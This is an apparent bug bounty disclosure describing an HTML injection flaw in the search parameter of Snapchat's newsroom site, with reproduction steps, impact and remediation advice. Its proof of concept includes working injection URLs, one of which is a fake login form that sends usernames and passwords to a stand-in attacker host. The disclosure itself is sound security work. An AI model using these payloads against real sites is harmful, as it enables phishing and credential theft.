# Title: HTML Injection on newsroom.snap.com via Search Query Parameter

- **Platform**: Snapchat Bug Bounty
- **Program**: Snapchat (HackerOne)
- **Severity**: Low
- **Date**: 14 August 2023
- **Researcher**: jotita3
- **Bounty**: $500
- **Report**: https://hackerone.com/reports/2018615

## Summary

An unauthenticated HTML injection vulnerability was discovered in Snapchat's Newsroom section. The `?q=` parameter in the search functionality at newsroom.snap.com did not properly sanitize user input, allowing attackers to inject arbitrary HTML code into the page. While JavaScript execution was not achieved due to CSP restrictions, the ability to inject HTML tags enabled phishing and content injection attacks.

## Technical Details

The search endpoint `https://newsroom.snap.com/[country_code]/search?q=` reflected user input directly into the HTML response without proper encoding. The `q` parameter value was inserted into the page's HTML structure, allowing attackers to break out of the existing context and inject arbitrary HTML elements.

The application had Content Security Policy (CSP) headers that prevented inline script execution, limiting the impact to HTML injection rather than full XSS. However, attackers could still inject form elements, iframes, and other HTML to create convincing phishing pages.

## Steps to Reproduce

1. Navigate to `https://newsroom.snap.com/en-US/search?q=test`
2. Observe the search query is reflected in the page
3. Inject HTML payload via the `q` parameter
4. Observe that injected HTML is rendered in the victim's browser

## Proof of Concept

The following URL demonstrates the vulnerability:

```
https://newsroom.snap.com/en-US/search?q=<h1>Injected</h1><a href="http://phishing.com">Click Me</a>
```

The response would contain the injected HTML rendered on the newsroom.snap.com domain. A more convincing phishing payload:

```
https://newsroom.snap.com/en-US/search?q=<form action="http://attacker.com/steal"><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>
```

This would display a login form on the legitimate snapchat.com domain, potentially tricking users into entering credentials.

## Impact

- Phishing attacks using a legitimate Snapchat domain (newsroom.snap.com)
- Defacement of Snapchat Newsroom search results pages
- Distribution of malicious links via search result manipulation
- Reduced user trust in Snapchat's web properties
- Potential for social engineering campaigns targeting Snapchat users

## Remediation

- Implement proper output encoding for the `q` parameter value
- Use `textContent` instead of `innerHTML` when rendering search queries
- Apply HTML entity encoding to user-supplied input before reflection
- Consider using a safer templating approach that auto-escapes values
- Maintain the existing CSP as a defense-in-depth measure

## References

- https://hackerone.com/reports/2018615
- https://www.redpacketsecurity.com/hackerone-bugbounty-disclosure-b-html-injection-on-newsroom-snap-com-via-search-q-b-jotita/
- https://cybersecuritywriteups.com/500-html-injection-in-snapchat-c546282f1f60
